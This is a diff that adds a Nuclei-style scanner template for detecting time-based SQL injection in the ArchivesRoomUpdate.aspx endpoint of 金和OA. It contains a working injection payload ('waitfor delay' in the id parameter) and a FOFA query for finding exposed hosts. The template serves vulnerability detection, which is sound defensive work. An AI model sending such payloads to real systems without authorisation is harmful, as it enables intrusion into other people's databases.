@@ -1,0 +1,45 @@
+id: jinher-archivesroomupdate-sqli
+info:
+  name: SQL Injection Vulnerability in ArchivesRoomUpdate.aspx
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The 金和OA ArchivesRoomUpdate.aspx endpoint is vulnerable to SQL Injection, allowing an attacker to execute arbitrary SQL queries.
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.Archives/ArchivesRoomUpdate.aspx/?id=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "修改档案室"
+          - "管理员"
+          - "档案室不能为空"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
